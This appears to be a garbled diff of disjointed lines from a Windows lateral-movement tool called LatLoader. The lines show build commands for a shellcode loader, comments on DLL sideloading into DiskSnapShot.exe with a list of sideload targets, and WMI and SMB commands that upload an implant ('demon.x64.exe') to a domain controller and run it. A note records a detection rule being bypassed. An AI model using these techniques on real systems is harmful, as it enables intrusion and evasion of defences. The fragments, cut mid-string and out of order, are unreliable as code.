@@ -1,0 +1,34 @@
+	$(CC_x64) src/standalone/writefile.c -s -w -static -o bin/standalone/writefile.exe
+    # Execute shellcode loader via DLL sideloading cryptbase.dll into DiskSnapShot.exe
+    # Move write.exe
+ C:\\Windows\\DiskSnapShot.exe
+ C:\\Windows\\Temp\\test.exe
+"		//BSTR wcCommandExecute = OLEAUT32$SysAllocString(L""cmd.exe"
+"	$(CC_x64) src/loader.c -static -w -s -Wl,-subsystem,windows -o bin/loader.exe"
+"        //BSTR wcCommandExecute = SysAllocString(L""cmd.exe"
+"    newParams = (targetHost, ""bin/loader.exe"", ""C:\\Windows\\load.exe"
+"    newParams = (targetHost, ""cmd.exe /c C:\\Windows\\DiskSnapShot.exe"
+"    newParams = (targetHost, ""cmd.exe /c C:\\Windows\\load.exe"
+"    newParams = (targetHost, ""cmd.exe /c copy C:\\Windows\\System32\\DiskSnapShot.exe"
+"    newParams = (targetHost, ""cmd.exe"
+"    newParams = (targetHost, targetFile, ""C:\\Windows\\load.exe"
+"// sideload options: compmgmtlauncher.exe, disksnapshot.exe, filehistory.exe, quickassist.exe"
+"// x86_64-w64-mingw32-gcc loader.c -static -w -s -Wl,-subsystem,windows -o loader.exe"
+"LatLoader exec dc1 ""cmd.exe"
+"LatLoader"", ""rupload"", ""Upload a file over SMB"", 0, ""target local_file remote_path"", ""dc1 /root/test.exe"
+"der"", ""load"", ""Upload file over SMB and execute it via WMI"", 0, ""target local_file"", ""dc1 /root/test.exe"
+"nto commonly DLL proxy execution binaries such as rundll32, regsvr32 and shared services via svchost.exe"
+"roccreate, ""LatLoader"", ""exec"", ""Execute a file or command via WMI"", 0, ""target command"", ""dc1 \""cmd.exe"
+**Bypass:** This rule was bypassed by executing the transferred file using cmd.exe
+.\wmiexec.exe dc1 'cmd.exe
+.\writefile.exe
+// .\write.exe
+// DiskLoader writefile dc1 /root/demon.x64.exe C:\Windows\Temp\ok.exe
+// sideload into DiskSnapShot.exe
+// x86_64-w64-mingw32-g++ -o /share/test.exe
+// x86_64-w64-mingw32-gcc writefile.c -w -static -o /share/write.exe
+LatLoader load dc1 /root/test.exe
+LatLoader rupload dc1 /root/demon.x64.exe C:\Windows\Temp\test.exe
+lone/wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -s -w -static -o bin/standalone/wmiexec.exe
+w64-mingw32-g++ wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -w -static -o /share/wmiexec.exe
+x86_64-w64-mingw32-gcc writefile.c -w -static -o /share/writefile.exe
